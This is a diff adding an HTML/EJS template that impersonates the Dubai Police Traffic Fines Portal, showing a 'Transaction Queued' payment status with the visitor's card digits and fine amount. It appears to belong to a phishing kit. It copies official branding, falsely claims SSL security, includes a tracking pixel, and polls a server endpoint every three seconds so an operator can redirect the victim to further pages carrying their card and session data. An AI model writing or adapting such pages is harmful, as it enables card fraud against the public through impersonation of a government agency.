@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Transaction Queued | Dubai Police</title>
+<link rel="icon" type="image/png" href="/dp-logo.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+.h-brand{display:flex;align-items:center;gap:10px;}
+.h-logo{width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0;}
+.h-logo img{width:100%;height:100%;object-fit:cover;}
+.h-name{color:white;font-weight:800;font-size:14px;line-height:1.2;}
+.h-sub{color:rgba(255,255,255,0.6);font-size:11px;}
+.h-badge{font-size:11px;color:rgba(255,255,255,0.5);}
+
+.main{flex:1;padding:20px 16px 32px;animation:fadeUp .4s ease both;}
+
+.status-card{background:white;border-radius:18px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);}
+
+.status-band{background:linear-gradient(135deg,#0f4a27,#1a6b3a);padding:28px 24px 24px;text-align:center;position:relative;overflow:hidden;}
+.status-band::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(255,255,255,0.1) 0%,transparent 70%);}
+
+.queue-ring{width:72px;height:72px;border-radius:50%;border:3px solid rgba(255,255,255,0.3);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;position:relative;z-index:1;}
+.queue-ring::after{content:'';position:absolute;inset:-8px;border-radius:50%;border:2px solid rgba(255,255,255,0.12);animation:pulse 2s ease-in-out infinite;}
+.queue-icon{width:44px;height:44px;background:rgba(255,255,255,0.2);border-radius:50%;display:flex;align-items:center;justify-content:center;}
+
+.status-title{font-size:18px;font-weight:800;color:white;margin-bottom:8px;position:relative;z-index:1;}
+.status-sub{font-size:13px;color:rgba(255,255,255,0.75);line-height:1.6;position:relative;z-index:1;}
+
+.details-section{padding:20px 20px 8px;}
+.detail-label{font-size:10px;font-weight:700;color:#9ca3af;text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;}
+.detail-row{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid #f1f5f9;font-size:13px;}
+.detail-row:last-child{border-bottom:none;}
+.detail-key{color:#6b7280;}
+.detail-val{font-weight:600;color:#0f172a;}
+
+.action-section{padding:8px 20px 20px;}
+.wait-indicator{display:flex;align-items:center;justify-content:center;gap:8px;padding:13px;background:#f0fdf4;border-radius:10px;font-size:12px;color:#166534;font-weight:600;}
+.wait-dot{width:8px;height:8px;background:#22c55e;border-radius:50%;animation:pulse 1.2s ease-in-out infinite;}
+
+.footer-note{text-align:center;font-size:11px;color:#9ca3af;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:5px;border-top:1px solid #f1f5f9;}
+</style>
+<%- include('_pixel') %>
+</head>
+<body>
+
+<header>
+  <div class="h-brand">
+    <div class="h-logo"><img src="/dp-logo.png" alt="Dubai Police"></div>
+    <div>
+      <div class="h-name">Dubai Police</div>
+      <div class="h-sub">شرطة دبي</div>
+    </div>
+  </div>
+  <div class="h-badge">Traffic Fines Portal</div>
+</header>
+
+<div class="main">
+  <div class="status-card">
+
+    <div class="status-band">
+      <div class="queue-ring">
+        <div class="queue-icon">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/>
+            <polyline points="12 6 12 12 16 14"/>
+          </svg>
+        </div>
+      </div>
+      <div class="status-title">Transaction Queued</div>
+      <div class="status-sub">Due to high demand, your transaction has been placed in a queue.<br>Please wait patiently.</div>
+    </div>
+
+    <div class="details-section">
+      <div class="detail-label">Transaction Details</div>
+      <div class="detail-row">
+        <span class="detail-key">Merchant</span>
+        <span class="detail-val">Dubai Police</span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-key">Amount</span>
+        <span class="detail-val" style="color:#1a6b3a;font-size:16px;">AED <%= totalFine.toLocaleString() %></span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-key">Card</span>
+        <span class="detail-val" style="font-family:monospace;">•••• •••• •••• <%= cardLast4 %></span>
+      </div>
+      <div class="detail-row">
+        <span class="detail-key">Date</span>
+        <span class="detail-val"><%= dateStr %></span>
+      </div>
+    </div>
+
+    <div class="action-section">
+      <div class="wait-indicator">
+        <div class="wait-dot"></div>
+        Processing your request, please wait…
+      </div>
+    </div>
+
+    <div class="footer-note">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Secured by 256-bit SSL encryption
+    </div>
+  </div>
+</div>
+
+<script>
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer || '') %>;
+const SID        = <%- JSON.stringify(sid) %>;
+const sidParams  = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+
+if (SID) {
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) {
+        const extra = d.params ? '&' + d.params : '';
+        window.location.href = '/' + d.page + sidParams + extra;
+      }
+    } catch(e) {}
+  }, 3000);
+}
+</script>
+</body>
+</html>
